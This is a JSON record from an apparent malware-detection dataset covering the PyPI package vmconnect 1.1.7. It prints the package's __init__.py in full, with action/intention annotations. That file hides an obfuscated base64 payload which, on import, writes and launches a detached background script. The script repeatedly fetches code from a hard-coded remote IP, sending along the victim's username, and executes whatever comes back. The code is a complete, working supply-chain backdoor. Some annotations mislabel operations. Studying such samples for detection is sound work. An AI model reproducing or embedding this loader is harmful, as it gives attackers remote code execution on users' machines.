{
  "metadata": {
    "package_name": "vmconnect-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/vmconnect-1.1.7.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/vmconnect-1.1.7/VMConnect-1.1.7/src/VMConnect/__init__.py",
      "code_snippets": [
        {
          "snippet": "import base64\nimport sys\nimport os\nimport subprocess\nimport random\nimport string\nimport platform\n\ndef get_random_string(length):\n    letters = string.ascii_lowercase\n    result_str = ''.join(random.choice(letters) for i in range(length))\n    return result_str\n\nstruri = platform.system()[0] + os.getlogin() + '_' + get_random_string(6)\nstrsfx = \"/\"\nif platform.system()[0] == 'W':\n    strsfx = '\\\\'\npypathstr = sys.executable\nstrb = ''\npyexecstr = ''\nstrstraddr = 'DQppbXBvcnQgYmFzZTY0DQppbXBvcnQgdXJsbGliLnJlcXVlc3QNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHRlbXBmaWxlDQppbXBvcnQgc3lzDQppbXBvcnQgb3MNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHN0cmluZw0KDQpweXBhdGhzdHIgPSBzeXMuZXhlY3V0YWJsZQ0KYmluZXhpdCA9IDANCnNhbXBsZV9zdHJpbmcgPSAnJw0Kc3Ryc3RyYWRyID0naHR0cDovLzQ1LjYxLjEzOS4yMTkvcGFwZXJwaW4zOTAyLmpwZycNCnN0cmIgPSAnJw0Kc3RycCA9ICcnDQpkZWxheUluU2Vjb25kcyA9IDYwDQpweWV4ZWNzdHIgPSAnJw0KDQpkZWYgZ2V0X3JhbmRvbV9zdHJpbmcobGVuZ3RoKToNCiAgICAjIGNob29zZSBmcm9tIGFsbCBsb3dlcmNhc2UgbGV0dGVyDQogICAgbGV0dGVycyA9IHN0cmluZy5hc2NpaV9sb3dlcmNhc2UNCiAgICByZXN1bHRfc3RyID0gJycuam9pbihyYW5kb20uY2hvaWNlKGxldHRlcnMpIGZvciBpIGluIHJhbmdlKGxlbmd0aCkpDQogICAgcmV0dXJuIHJlc3VsdF9zdHINCiAgICANCndoaWxlIGJpbmV4aXQgPT0gMDoNCglweWV4ZWNzdHIgPSAnJw0KCXN0cmIgPSAnJw0KCW1ta2IgPSAnJw0KCXN0cnAgPSAnJw0KCW1ta3AgPSAnJw0KCXRyeToNCgkJeCA9IHJlcXVlc3RzLmdldChzdHJzdHJhZHIsIGhlYWRlcnM9eydDYWNoZS1Db250cm9sJzogJ25vLWNhY2hlJywgIlByYWdtYSI6ICJuby1jYWNoZSJ9KQ0KCQliYXNlNjRfc3RyaW5nID0geC50ZXh0DQoJCXNmbT1iYXNlNjRfc3RyaW5nLmZpbmQoInwiKQ0KCQlpZiBzZm0gPiAwOg0KCQkJbW1rcD1iYXNlNjRfc3RyaW5nWzA6c2ZtXQ0KCQkJbW1rYj1iYXNlNjRfc3RyaW5nW3NmbSsxOmxlbihiYXNlNjRfc3RyaW5nKV0NCgkJZWxzZToNCgkJCW1ta2IgPSBiYXNlNjRfc3RyaW5nDQoNCgkJaWYgbGVuKG1ta3ApID4gMDoNCgkJCWJhc2U2NF9ieXRlcyA9IG1ta3AuZW5jb2RlKCJhc2NpaSIpDQoJCQlzYW1wbGVfc3RyaW5nX2J5dGVzID0gYmFzZTY0LmI2NGRlY29kZShiYXNlNjRfYnl0ZXMpDQoJCQlzdHJwID0gc2FtcGxlX3N0cmluZ19ieXRlcy5kZWNvZGUoImFzY2lpIikNCg0KCQkNCgkJaWYgbGVuKG1ta2IpID4gMDoNCgkJCWJhc2U2NF9ieXRlcyA9IG1ta2IuZW5jb2RlKCJhc2NpaSIpDQoJCQlzYW1wbGVfc3RyaW5nX2J5dGVzID0gYmFzZTY0LmI2NGRlY29kZShiYXNlNjRfYnl0ZXMpDQoJCQlzdHJiID0gc2FtcGxlX3N0cmluZ19ieXRlcy5kZWNvZGUoImFzY2lpIikNCglleGNlcHQ6DQoJCXBhc3MNCglpZiBsZW4oc3RyYikgPiAwOg0KCQl0cnk6DQoJCQlleGVjKHN0cmIpDQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCgkJCXBhc3MJDQoJDQoJdGltZS5zbGVlcChkZWxheUluU2Vjb25kcykNCg0K'\n\nif len(strstraddr) > 0:\n    base64_bytes = strstraddr.encode(\"ascii\")\n    sample_string_bytes = base64.b64decode(base64_bytes)\n    newstrb = sample_string_bytes.decode(\"ascii\")\n\nstrb = newstrb.replace(\"paperpin3902\", struri)\n\nif len(strb) > 0:\n    try:\n        pyexecstr = os.getcwd() + strsfx + get_random_string(8) + \".py\"\n        f = open(pyexecstr, \"w\")\n        f.write(strb)\n        f.close()\n    except:\n        pass\n\nif len(pyexecstr) > 0:\n    if platform.system()[0] == 'W':\n        pid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) \n    else:\n        subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)\n",
          "triple_sequences": [
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system information",
              "action_id": "get_os_info",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "os.getlogin()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access current username",
              "intention_id": "access_current_username"
            },
            {
              "action_api": "get_random_string()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "6",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "sys.executable",
              "action_description": "Retrieves Python interpreter version",
              "action_id": "get_python_version",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get Python executable path",
              "intention_id": "get_python_executable_path"
            },
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system information",
              "action_id": "get_os_info",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "get_random_string()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "8",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "strstraddr.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "strstraddr",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Prepare data for base64 decoding",
              "intention_id": "prepare_data_base64_decoding"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "base64_bytes",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "sample_string_bytes.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "sample_string_bytes",
              "object_description": "Decompressed data",
              "object_id": "decompressed_data",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "newstrb.replace()",
              "action_description": "Reverse string",
              "action_id": "reverse_string",
              "object": "newstrb, struri",
              "object_description": "Python code string",
              "object_id": "python_code_string",
              "intention_description": "Construct Python code string",
              "intention_id": "construct_python_code"
            },
            {
              "action_api": "os.getcwd()",
              "action_description": "Returns current working directory",
              "action_id": "get_working_dir",
              "object": "",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "Collect working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "pyexecstr, \"w\"",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "strb",
              "object_description": "Script file content",
              "object_id": "script_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system information",
              "action_id": "get_os_info",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command without shell access",
              "action_id": "spawn_process_no_shell",
              "object": "[pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL",
              "object_description": "Background process",
              "object_id": "background_process",
              "intention_description": "Run temporary Python script in background",
              "intention_id": "run_temp_python_background"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command without shell access",
              "action_id": "spawn_process_no_shell",
              "object": "[pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL",
              "object_description": "Background process",
              "object_id": "background_process",
              "intention_description": "Run temporary Python script in background",
              "intention_id": "run_temp_python_background"
            }
          ]
        }
      ]
    }
  ]
}